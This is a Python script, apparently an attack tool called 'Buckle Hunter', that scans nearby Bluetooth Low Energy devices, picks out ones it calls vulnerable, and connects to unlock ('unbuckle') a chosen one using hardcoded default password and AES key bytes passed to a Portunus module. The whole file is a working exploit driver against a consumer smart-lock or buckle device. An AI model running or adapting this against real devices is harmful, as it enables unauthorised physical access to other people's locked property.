from bluepy.btle import Scanner, DefaultDelegate
from bluepy.btle import Peripheral, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC
from portunus import Portunus
from pwn import log,ui,context
import time

SCAN_TIME = 5
DEVICE_NAME = 'test'
LOCK_PASS = bytes([0,0,0,0,0,0])
LOCK_AES = bytes([0,0,0,0,0,0,0,0])
#context.log_level = 'debug'

def print_banner():
    a = '''
     ▄▄▄▄    █    ██  ▄████▄   ██ ▄█▀ ██▓    ▓█████     ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
    ▓█████▄  ██  ▓██▒▒██▀ ▀█   ██▄█▒ ▓██▒    ▓█   ▀    ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
    ▒██▒ ▄██▓██  ▒██░▒▓█    ▄ ▓███▄░ ▒██░    ▒███      ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
    ▒██░█▀  ▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄ ▒██░    ▒▓█  ▄    ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
    ░▓█  ▀█▓▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄░██████▒░▒████▒   ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
    ░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░ ▒░▓  ░░░ ▒░ ░    ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
    ▒░▒   ░ ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░░ ░ ▒  ░ ░ ░  ░    ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
     ░    ░  ░░░ ░ ░ ░        ░ ░░ ░   ░ ░      ░       ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
     ░         ░     ░ ░      ░  ░       ░  ░   ░  ░    ░  ░  ░   ░              ░             ░  ░   ░     
          ░          ░
    '''
    print(a)

print_banner()

scanner = Scanner()
log.info(f"Scannig around for BLE.. Wait for {SCAN_TIME} seconds")
devices = scanner.scan(SCAN_TIME)
log.info(f"Scannig done. Found {len(devices)}")

buckles = []

if len(devices) == 0:
    log.warn("Where are you dude ? :X Maybe increase scan time ?")
    exit()
    
c = 0
c2 = 0
totallen = len(devices)
with log.progress('Taking closer look to found devices') as progress:
    for dev in devices:
        time.sleep(0.2)
        for (adtype, desc, value) in dev.getScanData():     
            if value==DEVICE_NAME:
                log.debug(f"Found {DEVICE_NAME} boi!\nRSSI: {dev.rssi} ADDR: {dev.addr} RAWDATA: {dev.rawData}")
                c += 1
                scanData = dev.rawData
                log.success(f"DEVICE INFO Numero: {c}\nAddr : {dev.addr}\nDevice id : {scanData[5:13]}\nBattery level: {int(scanData[14])}\nLock: {scanData[15]}")
                buckles.append((dev.addr,dev.addrType))
        c2 += 1
        # try:
        #     p = Peripheral(dev.addr,dev.addrType)
        # except:
        #     continue
        # try:
        #     fs = p.getServiceByUUID(TARGET_SERVICEUUID)
        #     log.success("Found the other one! Gonna exploit")
        #     buckles.append((dev.addr,dev.addrType))
        # except Exception as e:
        #     log.warning('Cant connect / service is not present')
        progress.status(f"{c2+1}/{totallen}")


if len(buckles) ==0:
    log.warn(f"No vulnerable device found out of {totallen}")
    exit()

if len(buckles) > 1:
    log.info("Which one do you want to unbuckle ? ")
    choice = input()
else:
    choice = 0

p = Peripheral(buckles[choice][0],buckles[choice][1])
l = Portunus(p,LOCK_PASS,LOCK_AES)
p.disconnect()




